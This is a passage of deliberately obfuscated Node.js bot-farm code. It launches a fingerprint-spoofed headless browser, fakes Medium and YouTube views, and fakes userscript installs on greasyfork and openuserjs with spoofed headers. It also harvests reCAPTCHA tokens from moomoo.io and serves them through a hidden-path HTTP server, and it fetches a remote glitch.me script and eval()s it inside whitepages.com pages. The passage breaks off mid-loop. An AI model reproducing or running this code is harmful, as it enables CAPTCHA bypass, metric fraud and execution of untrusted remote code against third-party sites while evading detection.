      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + X(0xe) + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + W(0x14, 'a1bb') + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + W(0x7, 'y9ib') + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x12aa + -0x1fa + -0x10b0
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x44 * 0x49 + 0x449 * -0x4 + 0x2 * -0x120)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log(Y(0x3, 'o7$Q') + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1ba8 + -0x5e * -0xd + -0x200a), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x31 * 0x89 + -0x5dc + 0x2079), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x7be + 0x1f6c * -0x1 + 0x17ae;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1 * -0x1691 + 0x255d + -0x3bee; w < getRandomInt(-0x1558 * -0x1 + -0x1cac + -0x755 * -0x1, 0x13d4 + 0x3 * -0x649 + -0xf4); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x35e + -0x3 * 0x5f46 + 0x10 * 0x20b9);
        }
      }();
    }, -0x18f2 + -0x16ee + 0x3044), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x83e + 0x12b0 * 0x1 + -0x1aee;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0xe05 * 0x1 + -0xac * 0x37 + 0x32f9 * 0x1, 0x1 * -0x1cdf + 0x163f + 0x6d2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x2 * 0x4855 + 0x868d + -0xa207);
    }, -0x17df + 0x1 * -0xce9 + 0x252c), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1c06 + -0x1 * -0x6ac + -0x1 * 0x22b2;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x140 + 0x1124 + -0x42c), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x10d5 + 0xac5 * -0x3 + 0xf7a), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x124a2e + -0xa5367 + 0x5c4d9);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x682 + 0x1 * -0x231a + 0x2a00);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const Z = c,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x2c7 * 0x9 + -0x7b0 * 0x5 + -0x1 * -0xe39);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + Z(0x19) + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1ff * 0x17 + -0xd * -0x3be + 0x9d * 0x2f);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = b,
    a1 = d,
    a0 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1afe * 0x1 + 0xfc1 * -0x1 + -0x1 * 0xb3c) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x89 + 0x2314 + -0x228a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x26f + -0x7ae + 0x53f, D['indexOf']('\x20'));
        return B ? E['slice'](-0x8df + 0x2028 + -0x1 * 0x1749, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1196 * 0x4 + -0x1 * -0x251d + 0x484b),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x2949 + 0x1 * 0x3b3b + -0x3d74),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + a0(0x1) + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + a1(0xb) + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + a2(0x5, 'Lwdl'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + a1(0x13) + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * -0x1b0f + -0x11b9 + 0x2cc8; k < -0xb88 + 0x22 * 0x115 + -0x193e; k++)
